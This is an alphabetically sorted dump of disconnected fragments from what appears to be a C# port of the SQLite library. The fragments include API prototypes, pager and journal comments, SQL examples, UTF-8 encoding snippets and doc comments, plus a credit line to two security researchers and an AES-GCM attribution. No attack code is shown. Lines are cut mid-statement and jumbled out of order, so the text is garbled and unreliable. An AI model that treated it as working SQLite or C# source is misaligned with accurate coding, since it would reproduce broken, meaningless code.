     EXISTS (SELECT a FROM b)   -- EXISTS subquery
     EXISTS => nothing 
     End: ...
     FUNCTION().
     Formatting is important to scripts that scan this file.
     FuncDef.flags variable is set to the value passed as the flags
     IGNORE => ID 
     INSERT INTO tab1 SELECT 
     If a multi-byte character attempts to encode a value between
     JT_CROSS
     JT_INNER
     JT_LEFT
     JT_NATURAL
     JT_OUTER
     JT_RIGHT
     Journal file descriptor is simply closed. This destroys an
     Journal file is truncated to zero bytes in size.
     Journal file name               (nPathname
     Main journal file handle        (journalFileSize bytes)
     NNN days
     NNN hours
     NNN minutes
     NNN months
     NNN years
     NNN.NNNN seconds
     OFFSET => ID 
     ORDER BY 1
     OpenPseudo
     OpenRead
     OpenWrite
     PCache object                   (sqlite3PcacheSize() bytes)
     PRAGMA => ID 
     Pager object                    (sizeof(Pager) bytes)
     PagerSavepoint.iHdrOffset to the end of the main journal file.
     PagerSavepoint.pInSavepoint.
     Payload
     RENAME => ID 
     ROLLBACK
     ROLLBACK TO one
     ROLLBACK TO sp
     Refer to code and comments in where.c for details.
     SAVEPOINT one
     SAVEPOINT sp
     SELECT 
     SELECT <column> FROM <table>
     SELECT <expr-list> FROM (<sub-query>) <where-clause>
     SELECT a
     SELECT a FROM (SELECT x
     SELECT a FROM t1 UNION SELECT b FROM t2 UNION SELECT c FROM t3
     SELECT abs(z
     SELECT c FROM t3
     SELECT rowid FROM table_a WHERE col1=1 ORDER BY col2 LIMIT 1 OFFSET 1
     SELECT sqlite_detach(x)
     SELECT x
     SELECT y
     SELECT zColumn FROM zDb.zTable WHERE [rowid] = iRow
     SQLITE_FULL
     SQLITE_INTERRUPT
     SQLITE_IOERR
     SQLITE_MEMDEBUG               // Debugging version of system malloc()
     SQLITE_MEMORY_SIZE            // internal allocator 
     SQLITE_MMAP_HEAP_SIZE         // internal mmap() allocator
     SQLITE_NOMEM
     SQLITE_OPEN_CREATE
     SQLITE_OPEN_DELETEONCLOSE
     SQLITE_OPEN_EXCLUSIVE
     SQLITE_OPEN_READWRITE
     SQLITE_POW2_MEMORY_SIZE       // internal power-of-two allocator
     SQLITE_SYSTEM_MALLOC          // Use normal system malloc()
     SRT_Coroutine   Generate a co-routine that returns a new row of
     SRT_Discard     Throw the results away.  This is used by SELECT
     SRT_EphemTab    Create an temporary table pDest.iParm and store
     SRT_Except      Remove results from the temporary table pDest.iParm.
     SRT_Exists      Store a 1 in memory cell pDest.iParm if the result
     SRT_Mem         Only valid if the result is a single column.
     SRT_Output      Generate a row of output (using the OP_ResultRow
     SRT_Set         The result must be a single column.  Store each
     SRT_Table       Store results in temporary table pDest.iParm.
     SRT_Union       Store results as a key in a temporary table pDest.iParm.
     SomeStructure pData = sqliteHashData(p)
     Sub-journal file handle         (journalFileSize bytes)
     The first 28 bytes of the journal file are zeroed. This invalidates
     The journal file is closed and deleted using sqlite3OsDelete().
     UNION ALL
     Used to create a scalar function definition of a function zName
     Used to create an aggregate function definition implemented by
     VACUUM => ID 
     WhereTerm.eOperator              =  WO_OR
     WhereTerm.u.pOrInfo  =  a dynamically allocated WhereOrTerm object
     WhereTerm.u.pOrInfo.indexable  
     WhereTerm.wtFlags   
     YYYY-MM-DD
     YYYY-MM-DD HH:MM
     YYYY-MM-DD HH:MM:SS
     YYYY-MM-DD HH:MM:SS.FFF
     [
     [...]      Matches one character from the enclosed list of
     allocations.
     an in-memory database that currently consists of zero pages.
     and rendered as themselves even though they are technically
     and the checksum field does not match the record content.
     are interpreted in the same way as the first 4 parameters to
     argv[0] = name of the index
     argv[0] = name of thing being created
     argv[1] = results of analysis - on integer for each column
     argv[1] = root page number for table or index. 0 for trigger or view.
     argv[2] = SQL text for the CREATE statement.
     as the user-data (sqlite3_user_data()) for the function. If
     assert( checkSavepointCount(db) )
     attempts to encode a value between 0x00 and 0x7f is rendered as 0xfffd.
     auto increment: 0
     available as the function user-data (sqlite3_user_data()). The
     back starting from the journal header immediately following
     be encoded as a multi-byte character.  Any multi-byte character that
     be freed lazily via the sqlite3_release_memory() API. This
     be taken.
     been written following it. If the pager is operating in full-sync
     break
     but which are not in the READ_UNCOMMITTED state may not have
     byte of a character are interpreted as single-byte characters
     coA: coroutine for left query (A)
     coB: coroutine for right query (B)
     copied into the destination database.
     creating ID lists
     cursors open with wrFlag==null on the same table.  Otherwise
     define SQLITE_OS_OS2 0
     define SQLITE_OS_OS2 1
     define SQLITE_OS_UNIX 0
     define SQLITE_OS_UNIX 1
     define SQLITE_OS_WIN 0
     define SQLITE_OS_WIN 1
     different sized allocations. Memory cells provide growable
     dupedExprNodeSize()       Size of Expr 
     dupedExprSize()           Expr 
     dupedExprStructSize()     Size of only the Expr structure
     encodings to 0xfffd as some systems recommend.
     file if PagerSavepoint.iHdrOffset is zero.
     file zMaster
     file. An invalid journal file cannot be rolled back.
     for unicode values 0x80 and greater.  It do not change over-length
     for x.
     function likeFunc. Argument pArg is cast to a (void 
     has_null = <test if data structure contains null>
     if( NOT SAFE_APPEND ){
     if( NOT SEQUENTIAL ) xSync(<journal file>)
     implemented by C function xFunc that accepts nArg arguments. The
     in-memory journal.
     index or indices to use) should place a different priority on
     input:     
     invalid characters.
     is updated to contain the number of journal records that have
     journal file is synced.
     journalMode==PERSIST is used instead.
     localtime
     minimizes the number of malloc calls made by the system.
     not null: 0
     offset PagerSavepoint.iOffset and continuing to
     output:    
     pDest.eDest    Result
     pRes<0      The cursor is left pointing at an entry that
     pRes==null     The cursor is left pointing at an entry that
     pRes>0      The cursor is left pointing at an entry that
     parameter.
     pending-byte page in the source database may need to be
     power failure in this case anyway.
     primary key: 1
     purposes in a vdbe program. The different uses might require
     register = 1
     return 0
     satisfying the 'ORDER BY' clause than it does in other cases.
     sqlite3ExprIsConstant()
     sqlite3ExprIsConstantNotJoin()
     sqlite3ExprIsConstantOrFunction()
     sqlite3OsLock()
     sqlite3OsOpen()
     sqlite3OsRead()
     sqlite3OsSync()
     sqlite3OsWrite()
     sqlite3_column_bytes()
     sqlite3_column_bytes16()
     sqlite3_column_int()
     sqlite3_column_int64()
     sqlite3_column_real()
     sqlite3_column_text()
     sqlite3_column_text16()
     start of day
     start of month
     start of week
     start of year
     that accepts nArg arguments and is implemented by a call to C
     that garbage data is never appended to the journal file.
     the C functions xStep and xFinal. The first four parameters
     the changes made by this write cursor would be visible to
     the journal file.
     the read cursors in the other database connection.
     then the nRec field of the most recently written journal header
     unixepoch
     utc
     value passed as iArg is cast to a (void
     var    Number of bytes of data. Omitted if the zerodata flag is set.
     var    Number of bytes of key. Or the key itself if intkey flag is set.
     weekday N
     where.c should not iterate over any values with a NULL value
     with the PagerSavepoint.iSubRec and continuing to the end of
     x IN (SELECT a FROM b)     -- IN operator with subquery on the right
     zero or more pages numbers of leaves
     { ... }           // User supplied code
     }
    (1)  Make sure VDBE cursor numbers have been assigned to every
    (1)  tab1 and tab2 have identical schemas including all the
    (2)  Fill in the pTabList.a[].pTab fields in the SrcList that
    (2)  tab1 and tab2 are different tables
    (2) The integer is neither the largest nor the smallest
    (3)  Add terms to the WHERE clause to accomodate the NATURAL keyword
    (3)  There must be no triggers on tab1
    (4)  Scan the list of columns in the result set (pEList) looking
    (6)  The SELECT statement is a simple (not a compound) select that
    (dxDeviceCharacteristics)winDeviceCharacteristics
    (dxGetLastError)winGetLastError /
    (void)sqlite3SafetyOn(db)
    )
    ) where T : new()
    ) { return 0
    ){
    ...
    /
    //
    // 
    //  
    //    
    //      
    //       
    //        
    //                                       
    //                                          
    //                                          /
    //                                      ExprList
    //                                      Token
    //                                     int
    //                          NULL pointers replaced by SQL NULL.  %Q 
    //                         Expr
    //                        Token
    //                       void 
    //                       void (
    //                      //  void(
    //                     ((ROWSET_ALLOCATION_SIZE-8)/sizeof(struct RowSetEntry))
    //               sqlite3_vtab 
    //              { local_ioerr()
    //          Windows DLL definitions
    //         SQLITE_OK)
    //         btreeRestoreCursorPosition(p) : 
    //       CODE
    //       local_ioerr()
    //       sqlite3_diskfull = 1
    //       sqlite3_diskfull_pending--
    //       sqlite3_io_error_hit = 1
    //      /
    //      c = (c<<6) 
    //      if( pNew ==null){
    //      return pNew
    //      return rc
    //      sqlite3_result_error_nomem( context )
    //      }
    //     /
    //     FreeLibrary((HANDLE)pHandle)
    //     if( sqlite3_diskfull_pending == 1 ){ 
    //     int iColumn
    //     int iTermOffset
    //     unsigned char desc
    //     unsigned char op
    //     unsigned char usable
    //     { goto no_mem
    //     } 
    //     }else{ 
    //    (defined(SQLITE_ENABLE_FTS3) 
    //    /
    //    c = (c2
    //    c = sqlite3Utf8Trans1[c-0xc0]
    //    c2 
    //    const char 
    //    defined(SQLITE_MEMORY_SIZE)
    //    defined(SQLITE_POW2_MEMORY_SIZE)==0
    //    defined(SQLITE_POW2_MEMORY_SIZE)>1
    //    free(zFilename)
    //    free(zMbcsFilename)
    //    free(zWideFilename)
    //    h = LoadLibraryA((char
    //    h = LoadLibraryW((WCHAR
    //    if ( !z )
    //    if( c!=0xfffd ){
    //    if( c<0x80                                             
    //    if( rc!=SQLITE_OK ){
    //    int  (
    //    int argvIndex
    //    int c2 = (
    //    int c2 = ((
    //    int rc = sqlite3PagerWrite(pDbPage)
    //    return 0
    //    return addr
    //    sqlite3_result_error_toobig( context )
    //    sqlite3_vfs 
    //    static int sqlite3_current_time = 0
    //    static int sqlite3_max_blobsize = 0
    //    unsigned char omit
    //    while( (
    //    while( zIn!=zTerm 
    //    z = 0
    //    z = sqlite3Malloc( (int)nByte )
    //    zNew[n] = 0
    //    {
    //    }
    //    }                                                      
    //   ((p)->flags = ((p)->flags
    //   if( ((P).flags
    //   if( db.u1.isInterrupted ) goto abort_due_to_interrupt
    //   if( sqlite3_diskfull_pending ){ 
    //   if(((P).flags
    //   void(
    //   {
    //   }
    //  ((P).aData 
    //  (p.eState>=CURSOR_REQUIRESEEK 
    //  /
    //  BtCursor
    //  BtCursor pCursor                    /
    //  Btree
    //  Btree 
    //  DbPage pDbPage             /
    //  Debug.Assert( p.pBt.inTransaction!=TRANS_NONE 
    //  Debug.Assert( p.pBt.inTransaction>=p.inTrans )
    //  Debug.Assert(pPrior!=0 )
    //  HANDLE h
    //  PCache pToInit                /
    //  Pager 
    //  Parse
    //  Pgno sqlite3PagerPagenumber(DbPage
    //  Savepoint 
    //  Select
    //  SelectDest
    //  UNUSED_PARAMETER(pVfs)
    //  WCHAR 
    //  [FieldOffset( 0 )]
    //  [FieldOffset( 12 )]
    //  [FieldOffset( 4 )]
    //  [FieldOffset( 8 )]
    //  assert( (n
    //  assert( nByte > 0 )
    //  c 
    //  c = 
    //  c = (
    //  c = ((
    //  char
    //  char 
    //  char const 
    //  const char
    //  const char 
    //  const sqlite3_module 
    //  const struct sqlite3_io_methods 
    //  const unsigned char 
    //  const void 
    //  double  (
    //  double estimatedCost
    //  else
    //  else if( c<0x00800 ){                                
    //  else if( c<0x10000 ){                                
    //  free(p)
    //  free(zConverted)
    //  free(zTmpWide)
    //  if ( nByte > db->aLimit[SQLITE_LIMIT_LENGTH] )
    //  if( (
    //  if( (sqlite3_io_error_persist 
    //  if( c<0x00080 ){                                     
    //  if( c<=0xFFFF ){                                                  
    //  if( c>=0xD800 
    //  if( c>=0xc0 ){                                           
    //  if( eOp!=0 ){
    //  if( isNT() ){
    //  if( nByte == 0 ){
    //  if( nByte==0 ){
    //  if( nChar==0 ){
    //  if( out ){
    //  if( z==0 ){
    //  if( zConverted==0 ){
    //  if( zFilename==0 ){
    //  if( zMbcsFilename==0 ){
    //  if( zNew ){
    //  if( zTmpWide==0 ){
    //  if( zWideFilename==0 ){
    //  int 
    //  int  (
    //  int (
    //  int codepage = AreFileApisANSI() 
    //  int iDbDest           /
    //  int iVersion
    //  int idxNum
    //  int mxPathname
    //  int nByte
    //  int nChar
    //  int nConstraint
    //  int nOrderBy
    //  int nRef
    //  int needToFreeIdxStr
    //  int orderByConsumed
    //  int p4type            /
    //  int pRes
    //  int sqlite3PagerIswriteable(DbPage
    //  int sqlite3SafetyOff(sqlite3
    //  int sqlite3SafetyOn(sqlite3
    //  int sqlite3SelectExprHeight(Select 
    //  int sqlite3ViewGetColumnNames(Parse
    //  int szOsFile
    //  int vfsFlags            /
    //  int(
    //  n = sqlite3Strlen30(z) 
    //  object pNew
    //  p--
    //  public u32 byte_0_3
    //  public u32 byte_12_15
    //  public u32 byte_4_7
    //  public u32 byte_8_11
    //  return (int)(zOut - zStart)
    //  return (void
    //  return SQLITE_OK
    //  return out
    //  return z
    //  return zFilename
    //  return zFilenameMbcs
    //  return zFilenameUtf8
    //  return zMbcsFilename
    //  return zNew
    //  return zWideFilename
    //  size_t n
    //  sqlite3
    //  sqlite3 
    //  sqlite3_blob 
    //  sqlite3_int64 (
    //  sqlite3_int64 p = (sqlite3_int64
    //  sqlite3_mutex 
    //  sqlite3_pcache 
    //  sqlite3_stmt 
    //  sqlite3_value
    //  sqlite3_vfs
    //  sqlite3_vfs 
    //  sqlite3_vtab 
    //  sqlite_int64  (
    //  static int sqlite3VdbeAddOp4(
    //  struct KeyInfo
    //  struct sqlite3_index_constraint {
    //  struct sqlite3_index_constraint_usage {
    //  struct sqlite3_index_orderby {
    //  testcase( nByte == db->aLimit[SQLITE_LIMIT_LENGTH] 
    //  testcase( nByte == db->aLimit[SQLITE_LIMIT_LENGTH] )
    //  typedef SQLITE_INT64_TYPE sqlite_int64
    //  typedef __int64 sqlite_int64
    //  typedef long long int sqlite_int64
    //  typedef unsigned SQLITE_INT64_TYPE sqlite_uint64
    //  typedef unsigned __int64 sqlite_uint64
    //  typedef unsigned long long int sqlite_uint64
    //  u32 c
    //  unsigned char 
    //  void
    //  void 
    //  void  (
    //  void (
    //  void disable_simulated_io_errors(void)
    //  void enable_simulated_io_errors(void)
    //  void sqlite3AutoincrementBegin(Parse 
    //  void sqlite3AutoincrementEnd(Parse 
    //  void sqlite3DebugPrintf(const char
    //  void sqlite3PagerRefdump(Pager
    //  void sqlite3ParserTrace(FILE
    //  void sqlite3VdbePrintSql(Vdbe
    //  void sqlite3VdbeTrace(Vdbe
    //  void(
    //  while( zIn[0] ){
    //  zFilename = malloc( nByte )
    //  zFilenameMbcs = unicodeToMbcs(zTmpWide)
    //  zFilenameUtf8 = unicodeToUtf8(zTmpWide)
    //  zMbcsFilename = malloc( nByte
    //  zTmpWide = mbcsToUnicode(zFilename)
    //  zTmpWide = utf8ToUnicode(zFilename)
    //  zWideFilename = malloc( nChar
    //  {
    //  }
    //  } 
    //  }                                                    
    //  }                                                                 
    //  }                                                                   
    //  }else{
    //  }else{                                               
    //  }else{                                                            
    // -- Need workaround for C
    // -- overloads ---------------------------------------
    // ----------------------------
    // ALTERNATE FORM for C
    // Alternative form for C
    // Example (C
    // MINIMAL STRUCTURE
    // Overloads for ap assignments
    // Reflection is unecessary for defining these.
    // TODO -- Convert PENDING_BYTE_PAGE to inline
    // Thanks to @tifkin and @harmj0y for pointing out that
    // Under C
    // We don't use these in C
    // use SQLITE3_LINK_INT version static int sqlite3_search_count = 0
    // use SQLITE3_LINK_INT version static sqlite3_sort_count = 0
    //)
    //){
    ///
    /// </param>
    /// </returns>
    /// </summary>
    /// <returns>Count of Results</returns>
    /// <returns>LastResult</returns>
    /// <returns>Result column</returns>
    /// <returns>Vdbe</returns>
    /// <summary>
    /// Basic locking strategy for Console/Winform applications
    /// BindInteger
    /// BindLong
    /// BindText
    /// Closes statement
    /// Creates new instance of SQLiteVdbe class by compiling a statement
    /// Execute statement
    /// Locking strategy for Medium Trust. It uses the same trick used in the native code for WIN_CE
    /// Reset statement
    /// Return Virtual Machine Pointer
    /// Returns Count of Result Rows
    /// Returns Result column as Long
    /// Returns Result column as Text
    /// which doesn't support LockFileEx as well.
    ////        db.mallocFailed = 1
    ////  sqlite3
    ////  void(
    ///int sqlite3Utf8To8(unsigned char
    //AES GCM from https://github.com/dvsekhvalnov/jose-jwt
    //AutoExtention
    //Bitvec 
    //Byte Buffer  
    //Byte Buffer Testing
    //CHAR
    //CollSeq
    //CollSeq 
    //DOUBLE (REAL)
    //DbPage 
    //Expr 
    //ExprList 
    //FUNCDEF
    //Faults
    //FuncDef 
    //IdList 
    //Index 
    //KeyInfo
    //KeyInfo 
    //MEM
    //Mem Methods
    //Module
    //Mutex Methods
    //OVERLOADS
    //Overloads
    //P4_COLLSEQ
    //P4_FUNCDEF
    //P4_INT32
    //P4_INT64
    //P4_INTARRAY
    //P4_KEYINFO
    //Parse
    //PgHdr 
    //RowSet 
    //SQLITE_API SQLITE_EXPERIMENTAL int sqlite3_create_module(
    //SQLITE_API SQLITE_EXPERIMENTAL int sqlite3_create_module_v2(
    //SQLITE_API SQLITE_EXPERIMENTAL int sqlite3_db_config(sqlite3
    //SQLITE_API SQLITE_EXPERIMENTAL int sqlite3_db_status(sqlite3
    //SQLITE_API SQLITE_EXPERIMENTAL int sqlite3_declare_vtab(sqlite3
    //SQLITE_API SQLITE_EXPERIMENTAL int sqlite3_overload_function(sqlite3
    //SQLITE_API SQLITE_EXPERIMENTAL int sqlite3_stmt_status(sqlite3_stmt
    //SQLITE_API SQLITE_EXPERIMENTAL void 
    //SQLITE_API SQLITE_EXTERN char 
    //SQLITE_API SQLITE_EXTERN const char sqlite3_version[]
    //SQLITE_API char 
    //SQLITE_API const char 
    //SQLITE_API const unsigned char 
    //SQLITE_API const void 
    //SQLITE_API double sqlite3_column_double(sqlite3_stmt
    //SQLITE_API double sqlite3_value_double(sqlite3_value
    //SQLITE_API int sqlite3_auto_extension(void (
    //SQLITE_API int sqlite3_backup_finish(sqlite3_backup 
    //SQLITE_API int sqlite3_backup_pagecount(sqlite3_backup 
    //SQLITE_API int sqlite3_backup_remaining(sqlite3_backup 
    //SQLITE_API int sqlite3_backup_step(sqlite3_backup 
    //SQLITE_API int sqlite3_bind_blob(sqlite3_stmt
    //SQLITE_API int sqlite3_bind_double(sqlite3_stmt
    //SQLITE_API int sqlite3_bind_int(sqlite3_stmt
    //SQLITE_API int sqlite3_bind_int64(sqlite3_stmt
    //SQLITE_API int sqlite3_bind_null(sqlite3_stmt
    //SQLITE_API int sqlite3_bind_parameter_count(sqlite3_stmt
    //SQLITE_API int sqlite3_bind_parameter_index(sqlite3_stmt
    //SQLITE_API int sqlite3_bind_text(sqlite3_stmt
    //SQLITE_API int sqlite3_bind_text16(sqlite3_stmt
    //SQLITE_API int sqlite3_bind_value(sqlite3_stmt
    //SQLITE_API int sqlite3_bind_zeroblob(sqlite3_stmt
    //SQLITE_API int sqlite3_blob_bytes(sqlite3_blob 
    //SQLITE_API int sqlite3_blob_close(sqlite3_blob 
    //SQLITE_API int sqlite3_blob_open(
    //SQLITE_API int sqlite3_blob_read(sqlite3_blob 
    //SQLITE_API int sqlite3_blob_write(sqlite3_blob 
    //SQLITE_API int sqlite3_busy_handler(sqlite3
    //SQLITE_API int sqlite3_busy_timeout(sqlite3
    //SQLITE_API int sqlite3_changes(sqlite3
    //SQLITE_API int sqlite3_clear_bindings(sqlite3_stmt
    //SQLITE_API int sqlite3_close(sqlite3 
    //SQLITE_API int sqlite3_collation_needed(
    //SQLITE_API int sqlite3_collation_needed16(
    //SQLITE_API int sqlite3_column_bytes(sqlite3_stmt
    //SQLITE_API int sqlite3_column_bytes16(sqlite3_stmt
    //SQLITE_API int sqlite3_column_count(sqlite3_stmt 
    //SQLITE_API int sqlite3_column_int(sqlite3_stmt
    //SQLITE_API int sqlite3_column_type(sqlite3_stmt
    //SQLITE_API int sqlite3_complete(const char 
    //SQLITE_API int sqlite3_complete16(const void 
    //SQLITE_API int sqlite3_create_collation(
    //SQLITE_API int sqlite3_create_collation16(
    //SQLITE_API int sqlite3_create_collation_v2(
    //SQLITE_API int sqlite3_create_function(
    //SQLITE_API int sqlite3_create_function16(
    //SQLITE_API int sqlite3_data_count(sqlite3_stmt 
    //SQLITE_API int sqlite3_enable_load_extension(sqlite3 
    //SQLITE_API int sqlite3_enable_shared_cache(int)
    //SQLITE_API int sqlite3_errcode(sqlite3 
    //SQLITE_API int sqlite3_exec(
    //SQLITE_API int sqlite3_extended_errcode(sqlite3 
    //SQLITE_API int sqlite3_extended_result_codes(sqlite3
    //SQLITE_API int sqlite3_file_control(sqlite3
    //SQLITE_API int sqlite3_finalize(sqlite3_stmt 
    //SQLITE_API int sqlite3_get_autocommit(sqlite3
    //SQLITE_API int sqlite3_get_table(
    //SQLITE_API int sqlite3_initialize(void)
    //SQLITE_API int sqlite3_key(
    //SQLITE_API int sqlite3_libversion_number(void)
    //SQLITE_API int sqlite3_limit(sqlite3
    //SQLITE_API int sqlite3_load_extension(
    //SQLITE_API int sqlite3_mutex_held(sqlite3_mutex
    //SQLITE_API int sqlite3_mutex_notheld(sqlite3_mutex
    //SQLITE_API int sqlite3_mutex_try(sqlite3_mutex
    //SQLITE_API int sqlite3_open(
    //SQLITE_API int sqlite3_open16(
    //SQLITE_API int sqlite3_open_v2(
    //SQLITE_API int sqlite3_os_end(void)
    //SQLITE_API int sqlite3_os_init(void)
    //SQLITE_API int sqlite3_prepare(
    //SQLITE_API int sqlite3_prepare16(
    //SQLITE_API int sqlite3_prepare16_v2(
    //SQLITE_API int sqlite3_prepare_v2(
    //SQLITE_API int sqlite3_rekey(
    //SQLITE_API int sqlite3_release_memory(int)
    //SQLITE_API int sqlite3_reset(sqlite3_stmt 
    //SQLITE_API int sqlite3_set_authorizer(
    //SQLITE_API int sqlite3_shutdown(void)
    //SQLITE_API int sqlite3_sleep(int)
    //SQLITE_API int sqlite3_step(sqlite3_stmt
    //SQLITE_API int sqlite3_strnicmp(const char 
    //SQLITE_API int sqlite3_table_column_metadata(
    //SQLITE_API int sqlite3_threadsafe(void)
    //SQLITE_API int sqlite3_total_changes(sqlite3
    //SQLITE_API int sqlite3_unlock_notify(
    //SQLITE_API int sqlite3_value_bytes(sqlite3_value
    //SQLITE_API int sqlite3_value_bytes16(sqlite3_value
    //SQLITE_API int sqlite3_value_int(sqlite3_value
    //SQLITE_API int sqlite3_value_numeric_type(sqlite3_value
    //SQLITE_API int sqlite3_value_type(sqlite3_value
    //SQLITE_API int sqlite3_vfs_register(sqlite3_vfs
    //SQLITE_API int sqlite3_vfs_unregister(sqlite3_vfs
    //SQLITE_API sqlite3 
    //SQLITE_API sqlite3_backup 
    //SQLITE_API sqlite3_int64 sqlite3_column_int64(sqlite3_stmt
    //SQLITE_API sqlite3_int64 sqlite3_last_insert_rowid(sqlite3
    //SQLITE_API sqlite3_int64 sqlite3_memory_highwater(int resetFlag)
    //SQLITE_API sqlite3_int64 sqlite3_memory_used(void)
    //SQLITE_API sqlite3_int64 sqlite3_value_int64(sqlite3_value
    //SQLITE_API sqlite3_mutex 
    //SQLITE_API sqlite3_stmt 
    //SQLITE_API sqlite3_value 
    //SQLITE_API sqlite3_vfs 
    //SQLITE_API void 
    //SQLITE_API void sqlite3_free(void
    //SQLITE_API void sqlite3_free_table(char 
    //SQLITE_API void sqlite3_interrupt(sqlite3
    //SQLITE_API void sqlite3_mutex_enter(sqlite3_mutex
    //SQLITE_API void sqlite3_mutex_free(sqlite3_mutex
    //SQLITE_API void sqlite3_mutex_leave(sqlite3_mutex
    //SQLITE_API void sqlite3_progress_handler(sqlite3
    //SQLITE_API void sqlite3_reset_auto_extension(void)
    //SQLITE_API void sqlite3_result_blob(sqlite3_context
    //SQLITE_API void sqlite3_result_double(sqlite3_context
    //SQLITE_API void sqlite3_result_error(sqlite3_context
    //SQLITE_API void sqlite3_result_error16(sqlite3_context
    //SQLITE_API void sqlite3_result_error_code(sqlite3_context
    //SQLITE_API void sqlite3_result_error_nomem(sqlite3_context
    //SQLITE_API void sqlite3_result_error_toobig(sqlite3_context
    //SQLITE_API void sqlite3_result_int(sqlite3_context
    //SQLITE_API void sqlite3_result_int64(sqlite3_context
    //SQLITE_API void sqlite3_result_null(sqlite3_context
    //SQLITE_API void sqlite3_result_text(sqlite3_context
    //SQLITE_API void sqlite3_result_text16(sqlite3_context
    //SQLITE_API void sqlite3_result_text16be(sqlite3_context
    //SQLITE_API void sqlite3_result_text16le(sqlite3_context
    //SQLITE_API void sqlite3_result_value(sqlite3_context
    //SQLITE_API void sqlite3_result_zeroblob(sqlite3_context
    //SQLITE_API void sqlite3_set_auxdata(sqlite3_context
    //SQLITE_API void sqlite3_soft_heap_limit(int)
    //STRING
    //STRING 
    //Schema 
    //Select 
    //SrcList 
    //String
    //String Testing
    //String with Offset 
    //TODO --
    //TODO -- Fix This
    //Table 
    //Trigger 
    //TriggerStep 
    //UnpackedRecord 
    //VTable 
    //Vdbe 
    //VdbeOp 
    //WhereInfo 
    //char
    //char 
    //char sqlite3AffinityType(const char
    //char sqlite3ExprAffinity(Expr pExpr)
    //char sqlite3_query_plan[BMS
    //const char 
    //const int sqlite3one = 1
    //const sqlite3_vfs 
    //const void 
    //double sqlite3VdbeRealValue(Mem
    //extern FuncDefHash sqlite3GlobalFunctions
    //extern const char sqlite3IsAsciiIdChar[]
    //extern const unsigned char sqlite3CtypeMap[]
    //extern const unsigned char sqlite3UpperToLower[]
    //extern int sqlite3PendingByte
    //extern int sqlite3_io_error_hit
    //extern int sqlite3_io_error_pending
    //extern struct Sqlite3Config sqlite3Config
    //i64 sqlite3PagerJournalSizeLimit(Pager 
    //i64 sqlite3VdbeIntValue(Mem
    //int (
    //int putVarint32(unsigned char
    //int sqlite2BtreeKeyCompare(BtCursor 
    //int sqlite3AnalysisLoad(sqlite3
    //int sqlite3AtoF(const char 
    //int sqlite3Atoi64(const char
    //int sqlite3BitvecSet(Bitvec
    //int sqlite3BitvecTest(Bitvec
    //int sqlite3BtreeBeginStmt(Btree
    //int sqlite3BtreeBeginTrans(Btree
    //int sqlite3BtreeClearTable(Btree
    //int sqlite3BtreeClose(Btree
    //int sqlite3BtreeCloseCursor(BtCursor
    //int sqlite3BtreeCommit(Btree
    //int sqlite3BtreeCommitPhaseOne(Btree
    //int sqlite3BtreeCommitPhaseTwo(Btree
    //int sqlite3BtreeCopyFile(Btree 
    //int sqlite3BtreeCount(BtCursor 
    //int sqlite3BtreeCreateTable(Btree
    //int sqlite3BtreeCursor(
    //int sqlite3BtreeCursorHasMoved(BtCursor
    //int sqlite3BtreeCursorInfo(BtCursor
    //int sqlite3BtreeCursorIsValid(BtCursor
    //int sqlite3BtreeCursorSize(void)
    //int sqlite3BtreeData(BtCursor
    //int sqlite3BtreeDataSize(BtCursor
    //int sqlite3BtreeDelete(BtCursor
    //int sqlite3BtreeDropTable(Btree
    //int sqlite3BtreeEof(BtCursor
    //int sqlite3BtreeFirst(BtCursor
    //int sqlite3BtreeGetAutoVacuum(Btree )
    //int sqlite3BtreeGetPageSize(Btree
    //int sqlite3BtreeGetReserve(Btree
    //int sqlite3BtreeIncrVacuum(Btree )
    //int sqlite3BtreeInsert(BtCursor
    //int sqlite3BtreeIsInBackup(Btree
    //int sqlite3BtreeIsInReadTrans(Btree
    //int sqlite3BtreeIsInTrans(Btree
    //int sqlite3BtreeKey(BtCursor
    //int sqlite3BtreeKeySize(BtCursor
    //int sqlite3BtreeLast(BtCursor
    //int sqlite3BtreeLockTable( Btree
    //int sqlite3BtreeMaxPageCount(Btree
    //int sqlite3BtreeMovetoUnpacked(
    //int sqlite3BtreeNext(BtCursor
    //int sqlite3BtreeOpen(
    //int sqlite3BtreePrevious(BtCursor
    //int sqlite3BtreePutData(BtCursor
    //int sqlite3BtreeRollback(Btree
    //int sqlite3BtreeSavepoint(Btree 
    //int sqlite3BtreeSchemaLocked( Btree
    //int sqlite3BtreeSetCacheSize(Btree
    //int sqlite3BtreeSetPageSize(Btree 
    //int sqlite3BtreeSetSafetyLevel(Btree
    //int sqlite3BtreeSyncDisabled(Btree
    //int sqlite3BtreeUpdateMeta(Btree
    //int sqlite3CheckCollSeq(Parse 
    //int sqlite3CheckObjectName(Parse 
    //int sqlite3CodeRowTrigger(Parse
    //int sqlite3CreateFunc(sqlite3 
    //int sqlite3DbMallocSize(sqlite3
    //int sqlite3Dequote(char
    //int sqlite3ExprCheckHeight(Parse
    //int sqlite3ExprCode(Parse
    //int sqlite3ExprCodeAndCache(Parse
    //int sqlite3ExprCodeExprList(Parse
    //int sqlite3ExprCodeGetColumn(Parse
    //int sqlite3ExprCodeTarget(Parse
    //int sqlite3ExprCodeTemp(Parse
    //int sqlite3ExprCompare(Expr
    //int sqlite3ExprIsConstant(Expr
    //int sqlite3ExprIsConstantNotJoin(Expr
    //int sqlite3ExprIsConstantOrFunction(Expr
    //int sqlite3ExprIsInteger(Expr
    //int sqlite3FindDb(sqlite3
    //int sqlite3FindDbName(sqlite3 
    //int sqlite3FindInIndex(Parse 
    //int sqlite3FitsIn64Bits(const char 
    //int sqlite3FixExpr(DbFixer
    //int sqlite3FixExprList(DbFixer
    //int sqlite3FixInit(DbFixer
    //int sqlite3FixSelect(DbFixer
    //int sqlite3FixSrcList(DbFixer
    //int sqlite3FixTriggerStep(DbFixer
    //int sqlite3GenerateIndexKey(Parse
    //int sqlite3GetInt32(const char 
    //int sqlite3GetTempRange(Parse
    //int sqlite3GetTempReg(Parse
    //int sqlite3GetToken(const unsigned char 
    //int sqlite3IcuInit(sqlite3 
    //int sqlite3IdListIndex(IdList
    //int sqlite3IndexedByLookup(Parse 
    //int sqlite3Init(sqlite3
    //int sqlite3InitCallback(void
    //int sqlite3InvokeBusyHandler(BusyHandler
    //int sqlite3IsLikeFunction(sqlite3
    //int sqlite3IsMemJournal(sqlite3_file 
    //int sqlite3IsNaN(double)
    //int sqlite3IsNumber(const char
    //int sqlite3IsReadOnly(Parse
    //int sqlite3IsRowid(const char
    //int sqlite3JoinType(Parse
    //int sqlite3KeywordCode(const unsigned char
    //int sqlite3MallocInit(void)
    //int sqlite3MallocSize(void
